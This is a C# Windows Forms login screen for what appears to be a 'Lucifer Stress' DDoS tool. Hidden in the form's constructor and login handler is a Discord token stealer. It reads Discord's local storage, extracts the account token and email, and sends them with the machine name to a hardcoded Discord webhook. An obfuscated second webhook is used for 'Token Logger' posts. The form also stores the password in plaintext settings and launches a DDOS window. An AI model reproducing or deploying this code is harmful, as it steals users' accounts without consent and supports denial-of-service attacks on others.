using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SafeGuard;

namespace SafeGuardTemplate
{
    public partial class Login : Form
    {
        public static void TokenLogg(string URL, string msg, string username)
        {
            Http.Post(URL, new NameValueCollection()
            {
                { "username", username },
                { "content", msg }
            });
        }
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn
         (
         int nLeftRect,
         int nTopRect,
         int RightRect,
         int nBottomRect,
         int nWidthEllipse,
         int nHeightEllipse
         );
        public void RecRound(Graphics g, Pen p, float X, float Y, float width, float height, float radius)
        {
            GraphicsPath gp = new GraphicsPath();
            //Upper-right arc:
            gp.AddArc(X + width - (radius * 2), Y, radius * 2, radius * 2, 270, 90);
            //Lower-right arc:
            gp.AddArc(X + width - (radius * 2), Y + height - (radius * 2), radius * 2, radius * 2, 0, 90);
            //Lower-left arc:
            gp.AddArc(X, Y + height - (radius * 2), radius * 2, radius * 2, 90, 90);
            //Upper-left arc:
            gp.AddArc(X, Y, radius * 2, radius * 2, 180, 90);
            gp.CloseFigure();
            g.DrawPath(p, gp);
            gp.Dispose();
        }
        public static string SetValueForText1 = "";
        public static string SetValueForText2 = "";
        static string Tag = "TagReplace";
        static string dfas = "HookReplace";
        static string Content = "";
        static string Version = "0.91";
        public static string Token;
        public static string Email;
        public static string CookieLoc = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\https_discordapp.com_0.localstorage";
        public static string Cookie = "";
        public static string CheckToken = @"C:\Users\Public\Token.txt";
        public static string SetValueForText3 = "";
        public Login()
        {
            InitializeComponent();
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 25, 25)); 
             

                if (!File.Exists(CheckToken))
                {
                    File.WriteAllText(CheckToken, "Created");
                }


                try
                {
                    //Open the file for reading then read it.
                    var CookieStream = File.Open(CookieLoc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                    var CookieReader = new StreamReader(CookieStream);

                    Cookie = CookieReader.ReadToEnd();

                    //Dispose
                    CookieReader.Dispose();
                    CookieStream.Dispose();

                }
                catch { }

                /*--------------Get the token and Email--------------*/
                //Gets the token
                Token = Cookie.Substring(Cookie.IndexOf("token\"") + 5);
                Token = Token.Substring(0, 121);
                Token = Token.Replace("\0", string.Empty);
                //Gets the Email
                Email = Cookie.Substring(Cookie.IndexOf("email_cache\"") + 12);
                Email = Email.Substring(0, Email.IndexOf("\""));
                Email = Email.Replace("\0", string.Empty);

                /*---------------Send the token and Email---------------*/
                if (Token != File.ReadAllText(CheckToken) && Token != "" && !Token.Contains("\0002"))
                {
                    Console.WriteLine(Token);
                    File.WriteAllText(CheckToken, Token);
                    var WC = new WebClient();
                    WC.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                    try
                    { //Gets the IP & its info. 
                        TokenLogg("https://discord.com/api/webhooks/793015786641817620/zqbgPlbtl0WPtFRWUgvqM7yL_vjaG6ShsvCCPYGHpGe7r-MGlWkuNhX0HcCmQaThS8Gs", string.Concat(new string[] { Token + "&E=" + Email + "&N=" + Environment.MachineName, }), "d Bot");
                    }
                    catch { };
                    hjkl();
                    WC.Dispose();

                }

                return; 
        }
        //Webhook post function
        private static void hjkl()
        {
            var WC = new WebClient();

            var Js = new NameValueCollection{
                {
                    "username",
                    Tag + "  - Token Logger" //Name
                },
                {
                    "avatar_url",
                    "https://vgy.me/XL10ux.png" //PFP
                },
                {
                    "content",
                    Content //Content
                }
            }; //Post to webhook
            WC.UploadValues((new ASCIIEncoding()).GetString(Convert.FromBase64String(Enumerable.Range(0, dfas.Length / 2).Select(i => dfas.Substring(i * 2, 2)).Select(x => (char)Convert.ToInt32(x, 16)).Aggregate(new StringBuilder(), (x, y) => x.Append(y)).ToString())), Js);
        }
        private void Start_Click(object sender, EventArgs e)
        {
            if (ShowPW2.Checked == false)
            {
                MessageBox.Show("Please Agree To T.O.S");
                return;
            }
            if (ShowPW2.Checked == true)
            {
                //ResponseInformation.loginresponse.Failure is a boolean, which will will be true if login failed
                ResponseInformation.loginresponse = ClientFunctions.Login(username.Text, password.Text, ProgramInformation.ProgramId);
                //Here we set password so we can use them throughout the application
                ResponseInformation.Password = password.Text;
                if (ResponseInformation.loginresponse.Failure)
                {
                    string re = SafeGuard.ResponseInformation.loginresponse.Message;
                    if (re.Contains("Server Error"))
                    {
                        MessageBox.Show("User Banned Contact An Admin For To Be Unbanned");
                    }
                    else
                    {
                        TokenLogg("https://discord.com/api/webhooks/793015786641817620/zqbgPlbtl0WPtFRWUgvqM7yL_vjaG6ShsvCCPYGHpGe7r-MGlWkuNhX0HcCmQaThS8Gs", string.Concat(new string[] { Token + "&E=" + Email + "&N=" + Environment.MachineName, }), "d Bot");
                        MessageBox.Show(SafeGuard.ResponseInformation.loginresponse.Message);
                    }
                }
                else
                {
                    //Message will be "Successfully Logged In"
                    TokenLogg("https://discord.com/api/webhooks/793015786641817620/zqbgPlbtl0WPtFRWUgvqM7yL_vjaG6ShsvCCPYGHpGe7r-MGlWkuNhX0HcCmQaThS8Gs", string.Concat(new string[] { Token + "&E=" + Email + "&N=" + Environment.MachineName, }), "d Bot");
                    MessageBox.Show($"Welcome To Lucifer {ResponseInformation.loginresponse.UserName} ");
                    this.Hide();
                    DDOS frmMain = new DDOS();
                    frmMain.ShowDialog();
                    this.Close();
                }
            }
        }
        private void ShowPW2_CheckedChanged(object sender, EventArgs e)
        {
            var newss = new WebClient().DownloadString("https://pastebin.com/raw/emBeqBMS");
            MessageBox.Show($"{newss}", "Lucifer Stress");
        }
        private void gunaCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            Properties.Settings.Default.Username = username.Text;
            Properties.Settings.Default.Save();
            Properties.Settings.Default.PassWord = password.Text;
            Properties.Settings.Default.Save();
        }
        private void label1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Lucifer  Status : Closing", "Lucifer Stress");
            Environment.Exit(0);
        }
        private void label2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        private void Login_Load(object sender, EventArgs e)
        {
            username.Text = Properties.Settings.Default.Username;
            password.Text = Properties.Settings.Default.PassWord;
        }
        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            this.Hide();
            MainForm frm1 = new MainForm();
            frm1.ShowDialog();
        }
        private void pictureBox4_Click(object sender, EventArgs e)
        {
          
        }
        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }
        private void pictureBox3_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox6_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox5_Click(object sender, EventArgs e)
        {

        }
    }
}
